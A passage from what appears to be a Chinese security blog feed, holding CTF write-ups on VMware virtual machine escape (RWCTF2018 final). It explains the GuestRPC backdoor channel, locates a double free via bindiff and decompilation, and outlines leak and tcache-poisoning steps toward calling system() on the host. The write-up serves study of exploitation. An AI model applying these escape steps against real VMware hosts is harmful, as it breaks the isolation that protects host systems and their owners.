class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h2 id="0x03-调试"><a href="#0x03-调试" class="headerlink" title="0x03 调试"></a>0x03 调试</h2><p>把断点放在realloc的位置，方便查看realloc后的堆布局。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-c15bb21f3a9a8d61cee8d1679228e3378e2a5c53.png" alt="图片.png"></p><p>在第一次free的位置看到了目标chunk，<code>0x7f797803a890</code>，这个chunk就是我们要复用的chunk。此次realloc结束，应该被挂进tcache。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-5f6609f03fbf2c05e9a32233dda512666ac8401a.png" alt="图片.png"></p><p>整个chunk的内容，可以看到大小是0x115，这里不知道为啥，连地址都没对齐。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-558cbd15fff8d78e9d81193abbc1855318dc2976.png" alt="图片.png"></p><p>单步执行之后，看到被挂进tcache的chunk。当channel 1，alloc取出这块chunk的时候，没有触发到realloc，直接走过去了。所以没断下来。因该在if的判断位置加一个断点，查看堆布局的。</p><p>不过此时可以看一下目标chunk的内容，有没有被改变。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-af593aa4f5b88482d210904f17b6bbbdca1fff56.png" alt="图片.png"></p><p>可以看到被挂上了熟悉的fd，但是却没有在相应的tcache里面，则可以推断，该chunk已经是alloc状态了。</p><p>继续执行，第二次free。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-cf83f7ba2ba709b640e4e31c373f2f4ce8374f6e.png" alt="图片.png"></p><p>此次realloc依然触发free。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-90ca8fba0d3563f28628ce7e637ba491a0af2167.png" alt="图片.png"></p><p>chunk被挂进了tcache，然后下一步执行dnd_version应该会把chunk取出，然后把虚表指针写入。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-3af68edeb6ac636b641ed4f28699a57cf02635d0.png" alt="图片.png"></p><p>成功写入，接下来就是改写system的过程。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-fbcde0816cf86bb685d83ddcd650d26b20807683.png" alt="图片.png"><br> channel 0的第一次free，记住chunk地址，0x7fa59c028e20，然后和leak一眼，对channel 1的UAF。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-b5c0c0dd42f4ab7ab018faf0a5ff2962d73667f5.png" alt="图片.png"></p><p>劫持成功，但是此时tcache中却看不到，可能heapinfo有点问题。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-08e8e166fe38c1669ae4f225b82c46399d34c220.png" alt="图片.png"></p><p>计算偏移后，目标位置被打入tcache的fd中，然后就是常规利用。把该内存malloc出来。然后写入system</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-babc2811b8fd15b84ebcde28aab4e8a3ad4d017e.png" alt="图片.png"></p><p>成功写入system，继续执行，然后弹出计算器。<br> <img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-b49b8f237dd3d59e57968a503942f5b52a884c87.png" alt="图片.png"></p><h2 id="0x05-思考"><a href="#0x05-思考" class="headerlink" title="0x05 思考"></a>0x05 思考</h2><p>emm，调试总是遇到一些问题，有时候挂上gdb，leak出来的基址就不对了。。。离谱，不知道为什么。想到的办法是，先发送完payload，然后再attach上去，exp和leak部分分开调试。</p><p>还有虚拟机的vmx，移动的时候，权限关系，可能导致打不开虚拟机，只有使用sudo  vmware才可以打开，不过这样打开的虚拟机，最后可以成功leak和执行，但是弹不出计算器，也就是命令执行失败，报错报了虚拟化错误，搞了好久没解决，最后也是莫名其妙的突然解决了。</p><p>两个vm类型的虚拟机逃逸收获很大，逆向的基础牢固了许多，realworld类的题目和CTF还是有很多差别，前者需要很好的逆向功底和对目标的熟悉，后者更多是技巧上的利用。</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>realworld</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>虚拟机逃逸（一）</title>
    <link href="/2022/06/22/%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%80%83%E9%80%B8%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <url>/2022/06/22/%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%80%83%E9%80%B8%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<blockquote><p>本文首发于奇安信攻防社区 ： <a href="https://forum.butian.net/share/1666">https://forum.butian.net/share/1666</a></p></blockquote><h2 id="0x01-概述"><a href="#0x01-概述" class="headerlink" title="0x01 概述"></a>0x01 概述</h2><p>虚拟化技术逐渐的开源和云计算的需要，使得虚拟化迅速发展，从KVM，XEN到qemu，docker…等，。</p><p>服务和软件定义网络的理念模糊了开发和运维的界限，也把更多的安全问题带入到虚拟化技术中。更多基础设施即服务（Iaas）管理平台的问题以及云供应商的不可控都给虚拟化技术的安全应用带来阻碍，而真正的虚拟化安全要从虚拟化技术本身谈起。</p><p>早期的虚拟化提出的是，宿主机和虚拟机之间的隔离，但是随着技术的发展，两机之间的通信让这种隔离变得模糊化，无论是FTP还是共享机制，都给安全带来的较大的挑战，本文针对虚拟机逃逸漏洞进行一个入门级别的分析。</p><h2 id="0x02-如何逃逸"><a href="#0x02-如何逃逸" class="headerlink" title="0x02 如何逃逸"></a>0x02 如何逃逸</h2><p><strong>首先，需要明确提权的模型</strong>，虚拟机逃逸的情况繁多，大致的模型和提权方式都类似。（后续的一些示例表示，非内核态也可以逃逸）</p><ul><li>虚拟机操作系统发送敏感请求，使操作系统陷入内核态</li><li>某些特权指令会进入ring0以下的状态，即交给<code>Hypervisor</code>处理</li><li>利用Hypervisor的脆弱性漏洞使得Hypervisor执行完特权指令后不产生指令状态的返回，使得执行完指令后依然停留在内核态</li><li>实现了提权后，可以渗透到Hypervisor和虚拟机的其他区域，破坏虚拟化的隔离机制，完成逃逸操作。</li></ul><p><strong>了解基本的流程之后，就是理解</strong>。</p><p><img src="https://i.bmp.ovh/imgs/2022/06/11/55bab3ee7a10d74b.png" alt="img"><br> 以上是一个虚拟化的基本模型，这里使用的是一个全虚拟化的模型，VMM即hypervisor，提权利用的是特殊指令执行时候会陷入root mode。</p><p>这类指令的存在让提权和逃逸变得可行。总结以上流程，写出一个逃逸需要的基本条件。</p><ol><li>有漏洞的内核，即有可以执行使得陷入hypervisor的指令</li><li>有一次匹配的逃逸，理解为可以使得宿主机弹出一个计算器</li></ol><p>第二点的利用，在不同的虚拟化技术中，不一样，下面以VM ware的逃逸，做一个简单的例子。</p><h2 id="0x03-RWCTF2018-final-VMescape"><a href="#0x03-RWCTF2018-final-VMescape" class="headerlink" title="0x03 RWCTF2018 final VMescape"></a>0x03 RWCTF2018 final VMescape</h2><p>这题是RWCTF2018 final，做一个入手的题目非常的合适。</p><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><p>经常使用vmware虚拟机的人一定会熟悉其拖拽功能，即Guest和host之间的文件传递以及复制之类的操作，都是基于拖拽实现的，拖拽的背后是Guest和host之间的通信机制。而Vm类型的逃逸中，利用的就是该通信机制，这类机制被设计是现在了vmtools当中，高版本的vmware，vmtools消失，直接被自带安装。</p><h3 id="backdoor机制"><a href="#backdoor机制" class="headerlink" title="backdoor机制"></a>backdoor机制</h3><p>vmtools中有一个叫做backdoor的接口，该接口被用来实现通信。<a href="https://sites.google.com/site/chitchatvmback/backdoor">官方文档</a>,github中的开源文档也有<a href="https://github.com/vmware/open-vm-tools/blob/master/open-vm-tools/lib/backdoor/backdoorGcc64.c#L74-L104">open-vmtools</a>.</p><figure><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span><span class="token function">Backdoor_InOut</span><span class="token punctuation">(</span>Backdoor_proto <span class="token operator">*</span>myBp<span class="token punctuation">)</span> <span class="token comment">// IN/OUT</span><span class="token punctuation">&#123;</span>   uint64 dummy<span class="token punctuation">;</span>   __asm__ <span class="token function">__volatile__</span><span class="token punctuation">(</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">__APPLE__</span></span>        <span class="token comment">/*         * Save %rbx on the stack because the Mac OS GCC doesn't want us to         * clobber it - it erroneously thinks %rbx is the PIC register.         * (Radar bug 7304232)         */</span>        <span class="token string">"pushq %%rbx"</span>           <span class="token string">"\n\t"</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>        <span class="token string">"pushq %%rax"</span>           <span class="token string">"\n\t"</span>        <span class="token string">"movq 40(%%rax), %%rdi"</span> <span class="token string">"\n\t"</span>        <span class="token string">"movq 32(%%rax), %%rsi"</span> <span class="token string">"\n\t"</span>        <span class="token string">"movq 24(%%rax), %%rdx"</span> <span class="token string">"\n\t"</span>        <span class="token string">"movq 16(%%rax), %%rcx"</span> <span class="token string">"\n\t"</span>        <span class="token string">"movq  8(%%rax), %%rbx"</span> <span class="token string">"\n\t"</span>        <span class="token string">"movq   (%%rax), %%rax"</span> <span class="token string">"\n\t"</span>        <span class="token string">"inl %%dx, %%eax"</span>       <span class="token string">"\n\t"</span>  <span class="token comment">/* NB: There is no inq instruction */</span>        <span class="token string">"xchgq %%rax, (%%rsp)"</span>  <span class="token string">"\n\t"</span>        <span class="token string">"movq %%rdi, 40(%%rax)"</span> <span class="token string">"\n\t"</span>        <span class="token string">"movq %%rsi, 32(%%rax)"</span> <span class="token string">"\n\t"</span>        <span class="token string">"movq %%rdx, 24(%%rax)"</span> <span class="token string">"\n\t"</span>        <span class="token string">"movq %%rcx, 16(%%rax)"</span> <span class="token string">"\n\t"</span>        <span class="token string">"movq %%rbx,  8(%%rax)"</span> <span class="token string">"\n\t"</span>        <span class="token string">"popq          (%%rax)"</span> <span class="token string">"\n\t"</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">__APPLE__</span></span>        <span class="token string">"popq %%rbx"</span>            <span class="token string">"\n\t"</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>其中有一条特权指令，<code>in</code>，这条指令在正常的操作系统执行会报错，但是在vm中的guest机器执行这条指令，这个异常会被 vmtools捕获，然后传递给<code>vmware-vmx.exe</code>进行通信操作。</p><p><strong>重点在于，backdoor普通用户也可以执行</strong>，所以，guest中，执行相应的代码，让操作系统陷入hypervisor层，然后再利用backdoor和host进行通信，触发此bug。</p><p>通信所需要的函数，再open-vmtools中也有实现。<code>Message_Send</code>和<code>Message_Recv</code>。<a href="https://github.com/vmware/open-vm-tools/blob/master/open-vm-tools/lib/message/message.c">git链接</a>。</p><p>在某一篇<a href="http://sysprogs.com/legacy/articles/kdvmware/guestrpc.shtml">文档</a>中，给出了该操作的基本使用.</p><figure><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">unsigned</span> <span class="token function">__declspec</span><span class="token punctuation">(</span>naked<span class="token punctuation">)</span> <span class="token function">GetMousePos</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    __asm    <span class="token punctuation">&#123;</span>        mov eax<span class="token punctuation">,</span> <span class="token number">564</span>D5868h        mov ecx<span class="token punctuation">,</span> <span class="token number">4</span>        mov edx<span class="token punctuation">,</span> <span class="token number">5658</span>h        in eax<span class="token punctuation">,</span> dx        ret    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">unsigned</span> mousepos <span class="token operator">=</span> <span class="token function">GetMousePos</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span> <span class="token string">"鼠标光标位置：x=%d,y=%d\n"</span> <span class="token punctuation">,</span> mousepos <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">,</span> mousepos <span class="token operator">&amp;</span> <span class="token number">0xFFFF</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><blockquote><p>If this program is executed on a real machine, the in instruction  will cause a “privileged instruction” exception, as user-mode code runs  in Ring 3. However, when this program is executed on the virtual  machine, it will print the correct mouse cursor position.</p><p>在真机上会报错，而在虚拟机中，将获得鼠标位置。</p></blockquote><h3 id="GuestRPC-Drag-and-Drop-RPCI"><a href="#GuestRPC-Drag-and-Drop-RPCI" class="headerlink" title="GuestRPC | Drag and Drop RPCI"></a>GuestRPC | Drag and Drop RPCI</h3><p>这是在backdoor基础上实现的更为灵活的通信方式。单个 GuestRPC 调用由一系列请求组成：</p><ul><li>打开 GuestRPC 通道</li><li>发送命令长度</li><li>发送命令数据</li><li>接收回复大小</li><li>接收回复数据</li><li>发出接收结束信号</li><li>关闭频道</li></ul><p>具体的函数实现后面再去分析，这里实际上是实现了一套不那么底层的通信机制。依靠这个机制，guest和host之间可以实现许多有意思的操作，例如：dnd（Drag n Drop）、cp（Copy Paste）操作、发送或获取信息等。</p><p><img src="https://i.bmp.ovh/imgs/2022/06/11/3a60818ae9d00e21.png" alt="img"></p><p>再&#x2F;lib&#x2F;include&#x2F;rpcout.h中定义了相关的一些函数，这些函数用来构建和摧毁rpc通道。</p><p>最后的调用追踪如下。</p><figure><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c">Rpcout_start<span class="token operator">-></span>Message_OpenAllocated<span class="token operator">-></span>Backdoor<span class="token punctuation">;</span>RpcOut_send<span class="token operator">-></span>Message_Send  <span class="token operator">&amp;</span> Message_Receive<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div></figure><p>这几处函数调用对backdoor的操作都是基于一个结构体。<code>Backdoor_proto</code></p><p>在<code>backdoor_types.h</code>中对其有定义。</p><figure><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">DECLARE_REG64_STRUCT</span> <span class="token punctuation">\</span>   <span class="token expression">DECLARE_REG32_STRUCT<span class="token punctuation">;</span> </span><span class="token punctuation">\</span>   <span class="token expression"><span class="token keyword">struct</span> <span class="token punctuation">&#123;</span> </span><span class="token punctuation">\</span>      <span class="token expression">uint32 low<span class="token punctuation">;</span> </span><span class="token punctuation">\</span>      <span class="token expression">uint32 high<span class="token punctuation">;</span> </span><span class="token punctuation">\</span>   <span class="token expression"><span class="token punctuation">&#125;</span> words<span class="token punctuation">;</span> </span><span class="token punctuation">\</span>   <span class="token expression">uint64 quad</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>实际上就是对相应的寄存器做一个设置。</p><p>除了以上的函数，vmx还提供了一种面向对象的方法实现以上功能，VMWareRPCChannel类，该类可以在内核和用户模式下使用。</p><blockquote><p>By using <a href="http://kdvmware.sysprogs.org/dox/a00032.html">VMWareRPCChannel</a> class it is possible to execute arbitrary GuestRPC requests, that  VMWare supports. However, the question of adding our own request types  is still open. Let’s examine the VMWARE-VMX.EXE internals. When a  GuestRPC is being issued by guest, code inside the VMWARE-VMX.EXE  searches the so-called GuestRPC handler table for a handler  corresponding the the issued request. A GuestRPC handler entry format  can be defined by the following structure:</p></blockquote><p>具体的实现这里不赘述，此外长亭的师傅也实现了一套Rpc的通信机制，在其知乎文章有分析。</p><p>通过这个RPCI可以直接向RPC，以往版本的漏洞分析中已经有该DnD漏洞的存在。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-8c778cb84b93e2c11fe15cbc508a537bd365b3e7.png" alt="图片.png"><br> memcpy没有size的判断，导致第二个包可以直接改totalsize为一个大值，这样导致了memcpy的溢出。发送Dnd的代码在dndCPTransportGuestRpc.hpp中，同样可以在open-vmtools里面找到源码。有人总结出了发送路径。</p><blockquote><p>rpcv3util::SendMsg-&gt;DnDCPTransportGuestRpc::SendPacket-&gt;RpcChannel_Send-&gt;Message_Send-&gt;backdoor</p></blockquote><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><h4 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h4><p>题目给出了</p><p>rwctf.ovf、rwctf-disk1.vmdk、rwctf.mf、vmware-vmx-patched、VMware-Workstation-Full-15.0.2-10952284.x86_64.bundle和vmware-vmx</p><p>使用vof vmdk mf可以创建一个题目相同环境的虚拟机，patched即为题目环境的vmx，而bundle安装包中的是给出的vmware-vmx。</p><p>使用bindiff比较patched和原版的不同可以快速定位漏洞位置，bindiff官网在外网，可以在52破解下载。</p><p>使用ida的bindiff插件，然后把diff结果导入bindiff软件即可。</p><p>查看出来的不同有1处，</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-d11ec0897a90dd8c3ffacd41ebf25d705c91d72f.png" alt="图片.png"><br> 双击查看函数内容</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-7d058ac9547b0c5f1d39ba965dd9b771c627d9fb.png" alt="图片.png"></p><p>可以看到patched地方加入了大部分的nop指令，回到ida仔细分析该流程处nop掉的东西是什么。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-213799f6fc4e4063222b7f27d7ff3bf3d6a95b52.png" alt="图片.png"></p><p>仔细比较发现有一处and被修改，还有一处call之前的一个mov指令被nop掉了，F5回去查看被改掉的位置。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-b60e6ffb7fa00eee453237c55f8b52c31cdb4593.png" alt="图片.png"></p><p>少了一处被置为0的操作，还有一处and操作修改，查看整个函数，大部分都是<code>GuestMsg: Channel</code>之类的东西，以及上面的switch操作，此外报错都是一些协议错误以及格式之类的东西，猜测这里是RPC指令的处理函数。</p><p>然后我就一头扎进了open-vm的源码，，。。</p><p>看了非常久，大概得出一个结构体的模型</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-61000bff1bf24027f6e26da3bdf1ea5dfc805946.png" alt="图片.png"></p><p>其中大部分的操作还看不太懂，然后突然想起来查看GuestRPC 的操作流程。</p><ul><li>打开 GuestRPC 通道</li><li>发送命令长度</li><li>发送命令数据</li><li>接收回复大小</li><li>接收回复数据</li><li>发出接收结束信号</li><li>关闭频道</li></ul><p>发现可以和这里的switch对应起来，可以更加清除的理解其内容。</p><p>这里去掉了置0操作，没有将第一处buf置空，第二处把标志改为了21，这里可能是漏洞形成的重点。</p><p>根据正常流程，目标处调用的是这样一个函数。</p><figure><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> __fastcall <span class="token function">close_backdoor</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> __int16 a2<span class="token punctuation">,</span> <span class="token keyword">char</span> a3<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">void</span> <span class="token operator">*</span>v4<span class="token punctuation">;</span> <span class="token comment">// rdi</span>  v4 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>a3 <span class="token operator">&amp;</span> <span class="token number">0x20</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">free</span><span class="token punctuation">(</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>a3 <span class="token operator">&amp;</span> <span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">sub_176D90</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token function">sub_55A0E0</span><span class="token punctuation">(</span><span class="token string">"GuestRpc: Closing RPCI backdoor channel %u after send completion\n"</span><span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">sub_189FE0</span><span class="token punctuation">(</span>a2<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>这里有一个if分支是free掉a1+8位置的buf，要求是a3 and 0x20!&#x3D;0，这就刚好和patch的地方相符合，这里会导致一次free。</p><p>此处释放的缓冲区是偏移为8的地方的缓冲区，该缓冲区对应于内部用于存储传递回用户的回复数据的缓冲区。</p><p>同时在switch&#x3D;6的时候，此处会再次释放，这就导致了DF存在，而在这个DF的中间，重复使用该区域，可以利用为UAF。</p><p>下面就有了基本的思路</p><ul><li>leak</li><li>更改tcache的fd</li><li>获取<code>rip</code>控制<code>rdi</code>调用<code>system(&quot;/usr/bin/xcalc &amp;&quot;)</code></li></ul><p>在此guestrpc的区间内，对堆的操作非常少，所以该漏洞利用也是比较稳固的。</p><h4 id="attack"><a href="#attack" class="headerlink" title="attack"></a>attack</h4><p>leak操作利用的是比较老套的uaf利用</p><ul><li>分配三个通道 [A]、[B] 和 [C]</li><li>将命令发送<code>info-set</code>到通道 [A]</li><li>打开通道 [B] 并发出 a <code>info-get</code>以检索我们刚刚设置的数据</li><li>在通道 [B] 上发出回复长度和回复读取命令</li><li>在通道 [B] 上调用错误的 finalize 命令，释放底层的回复缓冲区</li><li>在通道 [C] 上调用<code>info-get</code>并接收回复长度，它在我们刚刚分配的同一地址分配一个缓冲区</li><li>关闭通道 [B]，再次释放缓冲区</li><li>阅读频道[C]上的回复以泄露我们的数据</li></ul><p>但是在channel C上形成的uaf，却并不能做到在tcache中泄露想要的glibc地址，所以在此基础上还需要往C中填入一些可以利用的地址。</p><p>这时候考虑到2017年的一个cve，通过dnd_version造成vtable的leak。</p><p>分析dnd_version如下。ida中搜索<code>vmx.capability.dnd_version</code>，找到对应的bind函数。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-a3f065bd71745da225b1c04c4a6d034e89f421c8.png" alt="图片.png"></p><p>其他的RPC命令类似，在发送“vmx.capability.dnd_version”命令的时候，对应的处理函数中如果发现当前版本和设置的版本不一致，就会调用函数创建新的 object，把原来的版本的object销毁。</p><figure><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">sub_1116D0</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> __int64 a2<span class="token punctuation">,</span> __int64 a3<span class="token punctuation">,</span> <span class="token keyword">int</span> a4<span class="token punctuation">,</span> __int64 reply<span class="token punctuation">,</span> __int64 reply_len<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> v8<span class="token punctuation">;</span> <span class="token comment">// er12</span>  __int64 v9<span class="token punctuation">;</span> <span class="token comment">// rax</span>  __int64 v10<span class="token punctuation">;</span> <span class="token comment">// rsi</span>  <span class="token keyword">int</span> v12<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-30h] BYREF</span>  <span class="token keyword">int</span> v13<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+Ch] [rbp-2Ch] BYREF</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>a4 <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token function">set_reply</span><span class="token punctuation">(</span>reply<span class="token punctuation">,</span> reply_len<span class="token punctuation">,</span> <span class="token string">"1 argument expected"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v12 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span><span class="token function">sub_5611D0</span><span class="token punctuation">(</span>v13<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v12<span class="token punctuation">,</span> a3<span class="token punctuation">,</span> <span class="token string">" "</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token function">set_reply</span><span class="token punctuation">(</span>reply<span class="token punctuation">,</span> reply_len<span class="token punctuation">,</span> <span class="token string">"Non-integer argument"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  